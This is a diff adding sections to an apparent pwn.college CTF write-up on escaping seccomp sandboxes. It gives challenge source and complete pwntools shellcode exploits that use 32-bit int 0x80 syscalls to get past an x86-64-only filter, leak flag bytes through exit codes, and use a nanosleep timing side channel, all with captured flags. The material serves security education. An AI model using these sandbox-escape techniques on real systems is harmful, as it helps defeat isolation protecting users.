@@ -1944,7 +1944,7 @@ from pwn import *
 context.arch = "amd64"
 context.log_level = "error"
 
-shellcode = r"""
+shellcode = """
     /* openat(3, "flag", O_RDONLY) */
     mov rdi, 3
     lea rsi, [rip + path]
@@ -2034,5 +2034,1391 @@ Bad system call            python ~/script.py | /challenge/babyjail_level8
 > Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["close", "stat", "fstat", "lstat"]
 
 ```c title="/challenge/babyjail_level9.c" showLineNumbers
+#define _GNU_SOURCE 1
 
+#include <stdlib.h>
+#include <stdint.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <string.h>
+#include <time.h>
+#include <errno.h>
+#include <assert.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <sys/mman.h>
+#include <sys/sendfile.h>
+
+#include <seccomp.h>
+
+#include <capstone/capstone.h>
+
+#define CAPSTONE_ARCH CS_ARCH_X86
+#define CAPSTONE_MODE CS_MODE_64
+
+void print_disassembly(void *shellcode_addr, size_t shellcode_size)
+{
+    csh handle;
+    cs_insn *insn;
+    size_t count;
+
+    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
+    {
+        printf("ERROR: disassembler failed to initialize.\n");
+        return;
+    }
+
+    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
+    if (count > 0)
+    {
+        size_t j;
+        printf("      Address      |                      Bytes                    |          Instructions\n");
+        printf("------------------------------------------------------------------------------------------\n");
+
+        for (j = 0; j < count; j++)
+        {
+            printf("0x%016lx | ", (unsigned long)insn[j].address);
+            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
+            for (int k = insn[j].size; k < 15; k++) printf("   ");
+            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
+        }
+
+        cs_free(insn, count);
+    }
+    else
+    {
+        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
+        printf("      Address      |                      Bytes\n");
+        printf("--------------------------------------------------------------------\n");
+        for (unsigned int i = 0; i <= shellcode_size; i += 16)
+        {
+            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
+            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
+            printf("\n");
+        }
+    }
+
+    cs_close(&handle);
+}
+
+int main(int argc, char **argv, char **envp)
+{
+    assert(argc > 0);
+
+    printf("###\n");
+    printf("### Welcome to %s!\n", argv[0]);
+    printf("###\n");
+    printf("\n");
+
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 1);
+
+    puts("You may upload custom shellcode to do whatever you want.\n");
+
+    puts("For extra security, this challenge will only allow certain system calls!\n");
+
+    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
+    assert(shellcode == (void *)0x1337000);
+    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);
+
+    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
+    int shellcode_size = read(0, shellcode, 0x1000);
+
+    puts("This challenge is about to execute the following shellcode:\n");
+    print_disassembly(shellcode, shellcode_size);
+    puts("");
+
+    scmp_filter_ctx ctx;
+
+    puts("Restricting system calls (default: allow).\n");
+    ctx = seccomp_init(SCMP_ACT_ALLOW);
+    for (int i = 0; i < 512; i++)
+    {
+        switch (i)
+        {
+        case SCMP_SYS(close):
+            printf("Allowing syscall: %s (number %i).\n", "close", SCMP_SYS(close));
+            continue;
+        case SCMP_SYS(stat):
+            printf("Allowing syscall: %s (number %i).\n", "stat", SCMP_SYS(stat));
+            continue;
+        case SCMP_SYS(fstat):
+            printf("Allowing syscall: %s (number %i).\n", "fstat", SCMP_SYS(fstat));
+            continue;
+        case SCMP_SYS(lstat):
+            printf("Allowing syscall: %s (number %i).\n", "lstat", SCMP_SYS(lstat));
+            continue;
+        }
+        assert(seccomp_rule_add(ctx, SCMP_ACT_KILL, i, 0) == 0);
+    }
+
+    puts("Adding architecture to seccomp filter: x86_32.\n");
+    seccomp_arch_add(ctx, SCMP_ARCH_X86);
+
+    puts("Executing shellcode!\n");
+
+    assert(seccomp_load(ctx) == 0);
+
+    ((void(*)())shellcode)();
+}
+```
+
+This time, the rules are defined, and then the architecture `SCMP_ARCH_X86` is added.
+
+```c title="/challenge/babyjail_level9.c" showLineNumbers
+# ---- snip ----
+
+    ctx = seccomp_init(SCMP_ACT_ALLOW);
+    for (int i = 0; i < 512; i++)
+    {
+        switch (i)
+        {
+        case SCMP_SYS(close):
+            printf("Allowing syscall: %s (number %i).\n", "close", SCMP_SYS(close));
+            continue;
+        case SCMP_SYS(stat):
+            printf("Allowing syscall: %s (number %i).\n", "stat", SCMP_SYS(stat));
+            continue;
+        case SCMP_SYS(fstat):
+            printf("Allowing syscall: %s (number %i).\n", "fstat", SCMP_SYS(fstat));
+            continue;
+        case SCMP_SYS(lstat):
+            printf("Allowing syscall: %s (number %i).\n", "lstat", SCMP_SYS(lstat));
+            continue;
+        }
+        assert(seccomp_rule_add(ctx, SCMP_ACT_KILL, i, 0) == 0);
+    }
+
+    puts("Adding architecture to seccomp filter: x86_32.\n");
+    seccomp_arch_add(ctx, SCMP_ARCH_X86);
+
+# ---- snip ----
+```
+
+As a result of adding the x86 architecture after adding the rules, the rules are applied to the default x86-64 architecture and no x86.
+
+We can exploit this by swithing out `syscall` with `int 0x80`, and 
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+context.arch = "amd64"
+context.os = "linux"
+context.log_level = "error"
+
+shellcode = asm(r"""
+    /* open("/flag", O_RDONLY) */
+    lea rbx, [rip + flag]
+    xor ecx, ecx
+    mov eax, 5              /* sys_open */
+    int 0x80
+
+    /* read(fd, buf, 0x100) */
+    mov ebx, eax
+    lea rcx, [rip + buf]
+    mov edx, 0x100
+    mov eax, 3              /* sys_read */
+    int 0x80
+
+    /* write(1, buf, 0x100) */
+    mov ebx, 1
+    lea rcx, [rip + buf]
+    mov edx, 0x100
+    mov eax, 4              /* sys_write */
+    int 0x80
+
+flag:
+    .ascii "/flag"
+
+buf:
+    .space 0x100
+""")
+
+p = process("/challenge/babyjail_level9")
+p.send(shellcode)
+p.interactive()
+```
+
+```
+hacker@sandboxing~seccomp-arch32:~$ python ~/script.py
+###
+### Welcome to /challenge/babyjail_level9!
+###
+
+You may upload custom shellcode to do whatever you want.
+
+For extra security, this challenge will only allow certain system calls!
+
+Mapped 0x1000 bytes for shellcode at 0x1337000!
+Reading 0x1000 bytes of shellcode from stdin.
+
+This challenge is about to execute the following shellcode:
+
+      Address      |                      Bytes                    |          Instructions
+------------------------------------------------------------------------------------------
+0x0000000001337000 | 48 8d 1d 36 00 00 00                          | lea rbx, [rip + 0x36]
+0x0000000001337007 | 31 c9                                         | xor ecx, ecx
+0x0000000001337009 | b8 05 00 00 00                                | mov eax, 5
+0x000000000133700e | cd 80                                         | int 0x80
+0x0000000001337010 | 89 c3                                         | mov ebx, eax
+0x0000000001337012 | 48 8d 0d 2a 00 00 00                          | lea rcx, [rip + 0x2a]
+0x0000000001337019 | ba 00 01 00 00                                | mov edx, 0x100
+0x000000000133701e | b8 03 00 00 00                                | mov eax, 3
+0x0000000001337023 | cd 80                                         | int 0x80
+0x0000000001337025 | bb 01 00 00 00                                | mov ebx, 1
+0x000000000133702a | 48 8d 0d 12 00 00 00                          | lea rcx, [rip + 0x12]
+0x0000000001337031 | ba 00 01 00 00                                | mov edx, 0x100
+0x0000000001337036 | b8 04 00 00 00                                | mov eax, 4
+0x000000000133703b | cd 80                                         | int 0x80
+
+Restricting system calls (default: allow).
+
+Allowing syscall: close (number 3).
+Allowing syscall: stat (number 4).
+Allowing syscall: fstat (number 5).
+Allowing syscall: lstat (number 6).
+Adding architecture to seccomp filter: x86_32.
+
+Executing shellcode!
+
+pwn.college{M80kEnO9vG-P8JeppC9G9QZibAn.0VOzIDL4ITM0EzW}
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$  
+```
+
+&nbsp;
+
+## seccomp-minimal
+
+> Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["read", "exit"]. Note that "write" is disabled! You will need a creative way of extracting the flag data from your process!
+
+```c title="/challenge/babyjail_level10.c" showLineNumbers
+#define _GNU_SOURCE 1
+
+#include <stdlib.h>
+#include <stdint.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <string.h>
+#include <time.h>
+#include <errno.h>
+#include <assert.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <sys/mman.h>
+#include <sys/sendfile.h>
+
+#include <seccomp.h>
+
+#include <capstone/capstone.h>
+
+#define CAPSTONE_ARCH CS_ARCH_X86
+#define CAPSTONE_MODE CS_MODE_64
+
+void print_disassembly(void *shellcode_addr, size_t shellcode_size)
+{
+    csh handle;
+    cs_insn *insn;
+    size_t count;
+
+    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
+    {
+        printf("ERROR: disassembler failed to initialize.\n");
+        return;
+    }
+
+    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
+    if (count > 0)
+    {
+        size_t j;
+        printf("      Address      |                      Bytes                    |          Instructions\n");
+        printf("------------------------------------------------------------------------------------------\n");
+
+        for (j = 0; j < count; j++)
+        {
+            printf("0x%016lx | ", (unsigned long)insn[j].address);
+            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
+            for (int k = insn[j].size; k < 15; k++) printf("   ");
+            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
+        }
+
+        cs_free(insn, count);
+    }
+    else
+    {
+        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
+        printf("      Address      |                      Bytes\n");
+        printf("--------------------------------------------------------------------\n");
+        for (unsigned int i = 0; i <= shellcode_size; i += 16)
+        {
+            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
+            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
+            printf("\n");
+        }
+    }
+
+    cs_close(&handle);
+}
+
+int main(int argc, char **argv, char **envp)
+{
+    assert(argc > 0);
+
+    printf("###\n");
+    printf("### Welcome to %s!\n", argv[0]);
+    printf("###\n");
+    printf("\n");
+
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 1);
+
+    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");
+
+    puts("You may upload custom shellcode to do whatever you want.\n");
+
+    puts("For extra security, this challenge will only allow certain system calls!\n");
+
+    assert(argc > 1);
+
+    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
+    if (fd < 0)
+        printf("Failed to open the file located at `%s`.\n", argv[1]);
+    else
+        printf("Successfully opened the file located at `%s`.\n", argv[1]);
+
+    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
+    assert(shellcode == (void *)0x1337000);
+    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);
+
+    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
+    int shellcode_size = read(0, shellcode, 0x1000);
+
+    puts("This challenge is about to execute the following shellcode:\n");
+    print_disassembly(shellcode, shellcode_size);
+    puts("");
+
+    scmp_filter_ctx ctx;
+
+    puts("Restricting system calls (default: kill).\n");
+    ctx = seccomp_init(SCMP_ACT_KILL);
+    printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
+    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
+    printf("Allowing syscall: %s (number %i).\n", "exit", SCMP_SYS(exit));
+    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0) == 0);
+
+    puts("Executing shellcode!\n");
+
+    assert(seccomp_load(ctx) == 0);
+
+    ((void(*)())shellcode)();
+}
+```
+
+This challenge opens the file / directory that we pass as an argument.
+
+```c title="/challenge/babyjail_level5.c" showLineNumbers
+# ---- snip ----
+
+    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
+
+# ---- snip ----
+```
+
+### Leaking flag bytes using `exit`
+
+Linux lets a process exit with an 8-bit status code.
+We can pass each byte of the flag as the exit code in order to leak the flag.
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+context.arch = "amd64"
+context.os = "linux"
+context.log_level = "error"
+
+flag = b""
+
+BUF = 0x1337800
+
+for i in range(100):
+
+    shellcode = asm(f"""
+        /* read(3, buf, 0x100) */
+        mov rdi, 3
+        mov rsi, {BUF}
+        mov rdx, 0x100
+        xor eax, eax
+        syscall
+
+        /* exit(flag[i]) */
+        movzx edi, byte ptr [{BUF} + {i}]
+        mov eax, 60
+        syscall
+    """)
+
+    p = process([
+        "/challenge/babyjail_level10",
+        "/flag"
+    ])
+
+    p.send(shellcode)
+    p.wait()
+
+    code = p.poll()
+
+    if code < 0:
+        print(f"process died with signal {-code}")
+        break
+
+    if code == 0:
+        break
+
+    flag += bytes([code])
+    print(flag.decode(errors="ignore"))
+
+print("\nFLAG:", flag.decode(errors="ignore"))
+```
+
+```
+hacker@sandboxing~seccomp-minimal:~$ python ~/script.py
+p
+pw
+pwn
+pwn.
+pwn.c
+pwn.co
+pwn.col
+pwn.coll
+pwn.colle
+pwn.colleg
+pwn.college
+pwn.college{
+pwn.college{0
+pwn.college{0u
+pwn.college{0uX
+pwn.college{0uXf
+pwn.college{0uXfo
+pwn.college{0uXfoz
+pwn.college{0uXfozp
+pwn.college{0uXfozp4
+pwn.college{0uXfozp4e
+pwn.college{0uXfozp4ef
+pwn.college{0uXfozp4efR
+pwn.college{0uXfozp4efRY
+pwn.college{0uXfozp4efRYC
+pwn.college{0uXfozp4efRYCq
+pwn.college{0uXfozp4efRYCq_
+pwn.college{0uXfozp4efRYCq_1
+pwn.college{0uXfozp4efRYCq_1K
+pwn.college{0uXfozp4efRYCq_1KH
+pwn.college{0uXfozp4efRYCq_1KHu
+pwn.college{0uXfozp4efRYCq_1KHu3
+pwn.college{0uXfozp4efRYCq_1KHu35
+pwn.college{0uXfozp4efRYCq_1KHu355
+pwn.college{0uXfozp4efRYCq_1KHu3550
+pwn.college{0uXfozp4efRYCq_1KHu3550o
+pwn.college{0uXfozp4efRYCq_1KHu3550oG
+pwn.college{0uXfozp4efRYCq_1KHu3550oGX
+pwn.college{0uXfozp4efRYCq_1KHu3550oGXd
+pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.
+pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0
+pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0F
+pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM
+pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0
+pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0I
+pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0ID
+pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0IDL
+pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0IDL4
+pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0IDL4I
+pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0IDL4IT
+pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0IDL4ITM
+pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0IDL4ITM0
+pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0IDL4ITM0E
+pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0IDL4ITM0Ez
+pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0IDL4ITM0EzW
+pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0IDL4ITM0EzW}
+pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0IDL4ITM0EzW}
+
+
+FLAG: pwn.college{0uXfozp4efRYCq_1KHu3550oGXd.0FM0IDL4ITM0EzW}
+```
+
+&nbsp;
+
+## seccomp-timebased
+
+> Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["read"]. Note that "write" is disabled! You will need a creative way of extracting the flag data from your process!
+
+```c title="/challenge/babyjail_level11.c" showLineNumbers
+#define _GNU_SOURCE 1
+
+#include <stdlib.h>
+#include <stdint.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <string.h>
+#include <time.h>
+#include <errno.h>
+#include <assert.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <sys/mman.h>
+#include <sys/sendfile.h>
+
+#include <seccomp.h>
+
+#include <capstone/capstone.h>
+
+#define CAPSTONE_ARCH CS_ARCH_X86
+#define CAPSTONE_MODE CS_MODE_64
+
+void print_disassembly(void *shellcode_addr, size_t shellcode_size)
+{
+    csh handle;
+    cs_insn *insn;
+    size_t count;
+
+    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
+    {
+        printf("ERROR: disassembler failed to initialize.\n");
+        return;
+    }
+
+    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
+    if (count > 0)
+    {
+        size_t j;
+        printf("      Address      |                      Bytes                    |          Instructions\n");
+        printf("------------------------------------------------------------------------------------------\n");
+
+        for (j = 0; j < count; j++)
+        {
+            printf("0x%016lx | ", (unsigned long)insn[j].address);
+            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
+            for (int k = insn[j].size; k < 15; k++) printf("   ");
+            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
+        }
+
+        cs_free(insn, count);
+    }
+    else
+    {
+        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
+        printf("      Address      |                      Bytes\n");
+        printf("--------------------------------------------------------------------\n");
+        for (unsigned int i = 0; i <= shellcode_size; i += 16)
+        {
+            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
+            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
+            printf("\n");
+        }
+    }
+
+    cs_close(&handle);
+}
+
+int main(int argc, char **argv, char **envp)
+{
+    assert(argc > 0);
+
+    printf("###\n");
+    printf("### Welcome to %s!\n", argv[0]);
+    printf("###\n");
+    printf("\n");
+
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 1);
+
+    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");
+
+    puts("You may upload custom shellcode to do whatever you want.\n");
+
+    puts("For extra security, this challenge will only allow certain system calls!\n");
+
+    assert(argc > 1);
+
+    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
+    if (fd < 0)
+        printf("Failed to open the file located at `%s`.\n", argv[1]);
+    else
+        printf("Successfully opened the file located at `%s`.\n", argv[1]);
+
+    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
+    assert(shellcode == (void *)0x1337000);
+    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);
+
+    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
+    int shellcode_size = read(0, shellcode, 0x1000);
+
+    puts("This challenge is about to execute the following shellcode:\n");
+    print_disassembly(shellcode, shellcode_size);
+    puts("");
+
+    scmp_filter_ctx ctx;
+
+    puts("Restricting system calls (default: kill).\n");
+    ctx = seccomp_init(SCMP_ACT_KILL);
+    printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
+    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
+    printf("Allowing syscall: %s (number %i).\n", "nanosleep", SCMP_SYS(nanosleep));
+    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(nanosleep), 0) == 0);
+
+    puts("Executing shellcode!\n");
+
+    assert(seccomp_load(ctx) == 0);
+
+    ((void(*)())shellcode)();
+}
+```
+
+### Leaking flag bytes using `nanosleep`
+
+For every flag position (idx), we can try characters:
+
+```py
+for c in charset:
+```
+
+Suppose:
+
+```py
+flag[idx] == 'p'
+```
+
+Then shellcode compares:
+
+```asm
+mov al, byte ptr [BUF + idx]
+cmp al, guess
+```
+
+Then we have two options based on the result of the comparison:
+1. If the characters are the same, we can sleep for a certain amount of time.
+2. If the characters are not the same, we can crash the program.
+
+
+### Exploit
+
+```py title="" showLineNumbers
+from pwn import *
+import time
+import string
+
+context.arch = "amd64"
+context.os = "linux"
+context.log_level = "error"
+
+BUF = 0x1337800
+
+flag = b""
+
+charset = string.ascii_letters + string.digits + "{}._-"
+
+for idx in range(128):
+
+    for c in charset:
+
+        guess = ord(c)
+
+        shellcode = asm(f"""
+            /* read(3, BUF, 0x100) */
+            mov rdi, 3
+            mov rsi, {BUF}
+            mov rdx, 0x100
+            xor eax, eax
+            syscall
+
+            /* compare flag[idx] */
+            mov al, byte ptr [{BUF} + {idx}]
+            cmp al, {guess}
+            jne crash
+
+            /* nanosleep(&ts, NULL) */
+            lea rdi, [rip + ts]
+            xor esi, esi
+            mov eax, 35
+            syscall
+
+        crash:
+            mov rax, [0]
+
+        ts:
+            .quad 1
+            .quad 0
+        """)
+
+        start = time.time()
+
+        p = process([
+            "/challenge/babyjail_level11",
+            "/flag"
+        ])
+
+        p.send(shellcode)
+        p.wait()
+
+        elapsed = time.time() - start
+
+        p.close()
+
+        if elapsed > 0.8:
+
+            flag += bytes([guess])
+
+            print(flag.decode())
+
+            if c == "}":
+                print("\nFLAG:", flag.decode())
+                exit()
+
+            break
+```
+
+```
+hacker@sandboxing~seccomp-timebased:~$ python ~/script.py
+p
+pw
+pwn
+pwn.
+pwn.c
+pwn.co
+pwn.col
+pwn.coll
+pwn.colle
+pwn.colleg
+pwn.college
+pwn.college{
+pwn.college{s
+pwn.college{sJ
+pwn.college{sJM
+pwn.college{sJMI
+pwn.college{sJMIl
+pwn.college{sJMIlS
+pwn.college{sJMIlSD
+pwn.college{sJMIlSDb
+pwn.college{sJMIlSDbC
+pwn.college{sJMIlSDbCV
+pwn.college{sJMIlSDbCV5
+pwn.college{sJMIlSDbCV5i
+pwn.college{sJMIlSDbCV5i1
+pwn.college{sJMIlSDbCV5i1l
+pwn.college{sJMIlSDbCV5i1li
+pwn.college{sJMIlSDbCV5i1li7
+pwn.college{sJMIlSDbCV5i1li7B
+pwn.college{sJMIlSDbCV5i1li7B7
+pwn.college{sJMIlSDbCV5i1li7B7r
+pwn.college{sJMIlSDbCV5i1li7B7rz
+pwn.college{sJMIlSDbCV5i1li7B7rzq
+pwn.college{sJMIlSDbCV5i1li7B7rzqa
+pwn.college{sJMIlSDbCV5i1li7B7rzqaN
+pwn.college{sJMIlSDbCV5i1li7B7rzqaNT
+pwn.college{sJMIlSDbCV5i1li7B7rzqaNTq
+pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK
+pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3
+pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.
+pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0
+pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0V
+pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM
+pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0
+pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0I
+pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0ID
+pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0IDL
+pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0IDL4
+pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0IDL4I
+pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0IDL4IT
+pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0IDL4ITM
+pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0IDL4ITM0
+pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0IDL4ITM0E
+pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0IDL4ITM0Ez
+pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0IDL4ITM0EzW
+pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0IDL4ITM0EzW}
+
+FLAG: pwn.college{sJMIlSDbCV5i1li7B7rzqaNTqK3.0VM0IDL4ITM0EzW}
+```
+
+&nbsp;
+
+## seccomp-readonly
+
+> Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["read"]. Note that "write" is disabled! You will need a creative way of extracting the flag data from your process!
+
+```c title="" showLineNumbers
+#define _GNU_SOURCE 1
+
+#include <stdlib.h>
+#include <stdint.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <string.h>
+#include <time.h>
+#include <errno.h>
+#include <assert.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <sys/mman.h>
+#include <sys/sendfile.h>
+
+#include <seccomp.h>
+
+#include <capstone/capstone.h>
+
+#define CAPSTONE_ARCH CS_ARCH_X86
+#define CAPSTONE_MODE CS_MODE_64
+
+void print_disassembly(void *shellcode_addr, size_t shellcode_size)
+{
+    csh handle;
+    cs_insn *insn;
+    size_t count;
+
+    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
+    {
+        printf("ERROR: disassembler failed to initialize.\n");
+        return;
+    }
+
+    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
+    if (count > 0)
+    {
+        size_t j;
+        printf("      Address      |                      Bytes                    |          Instructions\n");
+        printf("------------------------------------------------------------------------------------------\n");
+
+        for (j = 0; j < count; j++)
+        {
+            printf("0x%016lx | ", (unsigned long)insn[j].address);
+            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
+            for (int k = insn[j].size; k < 15; k++) printf("   ");
+            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
+        }
+
+        cs_free(insn, count);
+    }
+    else
+    {
+        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
+        printf("      Address      |                      Bytes\n");
+        printf("--------------------------------------------------------------------\n");
+        for (unsigned int i = 0; i <= shellcode_size; i += 16)
+        {
+            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
+            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
+            printf("\n");
+        }
+    }
+
+    cs_close(&handle);
+}
+
+int main(int argc, char **argv, char **envp)
+{
+    assert(argc > 0);
+
+    printf("###\n");
+    printf("### Welcome to %s!\n", argv[0]);
+    printf("###\n");
+    printf("\n");
+
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 1);
+
+    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");
+
+    puts("You may upload custom shellcode to do whatever you want.\n");
+
+    puts("For extra security, this challenge will only allow certain system calls!\n");
+
+    assert(argc > 1);
+
+    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
+    if (fd < 0)
+        printf("Failed to open the file located at `%s`.\n", argv[1]);
+    else
+        printf("Successfully opened the file located at `%s`.\n", argv[1]);
+
+    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
+    assert(shellcode == (void *)0x1337000);
+    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);
+
+    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
+    int shellcode_size = read(0, shellcode, 0x1000);
+
+    puts("This challenge is about to execute the following shellcode:\n");
+    print_disassembly(shellcode, shellcode_size);
+    puts("");
+
+    scmp_filter_ctx ctx;
+
+    puts("Restricting system calls (default: kill).\n");
+    ctx = seccomp_init(SCMP_ACT_KILL);
